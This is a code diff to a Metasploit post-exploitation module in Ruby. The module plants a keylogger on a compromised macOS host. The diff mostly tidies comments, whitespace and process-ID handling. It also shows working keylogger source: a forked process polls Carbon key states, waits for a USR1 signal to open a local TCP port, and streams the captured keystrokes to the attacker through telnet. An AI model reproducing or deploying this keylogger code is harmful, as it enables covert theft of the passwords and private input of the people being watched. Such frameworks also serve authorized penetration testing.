@@ -12,8 +12,10 @@ class Metasploit3 < Msf::Post
 	include Msf::Post::File
 	include Msf::Auxiliary::Report
 
-	# the port used for telnet IPC. It is only open after the
-	# keylogger process is sent a USR1 signal
+	# when we need to read from the keylogger,
+	# we first "knock" the process by sending a USR1 signal.
+	# the keylogger opens a local tcp port (22899 by default) momentarily
+	# that we can connect to and read from (using cmd_exec(telnet ...)).
 	attr_accessor :port
 
 	# the pid of the keylogger process
@@ -51,7 +53,7 @@ class Metasploit3 < Msf::Post
 					[ true, 'The time between transferring log chunks.', 10 ]
 				),
 				OptInt.new('LOGPORT', 
-					[ false, 'Local port opened for transferring logs', 22899 ]
+					[ false, 'Local port opened for momentarily for log transfer', 22899 ]
 				)
 			]
 		)
@@ -94,7 +96,7 @@ class Metasploit3 < Msf::Post
 					print_status "Waiting #{datastore['SYNCWAIT']} seconds."
 					Rex.sleep(datastore['SYNCWAIT'])
 					print_status "Sending USR1 signal to open TCP port..."
-					cmd_exec("kill -USR1 #{@pid}")
+					cmd_exec("kill -USR1 #{self.pid}")
 					print_status "Dumping logs..."
 					log = cmd_exec("telnet localhost #{self.port}")
 					log_a = log.scan(/^\[.+?\] \[.+?\] .*$/)
@@ -125,14 +127,13 @@ class Metasploit3 < Msf::Post
 	end
 
 	def cleanup
+		return if session.nil?
 		return if not @cleaning_up.nil?
 		@cleaning_up = true
 
-		return if session.nil?
-
-		if @pid.to_i > 0
+		if self.pid.to_i > 0
 			print_status("Cleaning up...")
-			kill_process(@pid)
+			kill_process(self.pid)
 		end
 	end
 
@@ -190,9 +191,9 @@ child_pid = fork do
   log = ''
   log_semaphore = Mutex.new
   Signal.trap("USR1") do # signal used for port knocking
-  	if not @server_listening
+    if not @server_listening
       @server_listening = true
-  	  Thread.new do
+      Thread.new do
         require 'socket'
         server = TCPServer.new(options[:port])
         client = server.accept
@@ -252,7 +253,7 @@ child_pid = fork do
     (0...128).each do |k|
       # pulled from apple's developer docs for Carbon#KeyMap/GetKeys
       if ((bytes[k>>3].ord >> (k&7)) & 1 > 0)
-      	if not prev_down[k]
+        if not prev_down[k]
           kchr = Carbon.GetScriptVariable(SM_KCHR_CACHE, SM_CURRENT_SCRIPT)
           curr_ascii = Carbon.KeyTranslate(kchr, k, state)
           curr_ascii = curr_ascii >> 16 if curr_ascii < 1
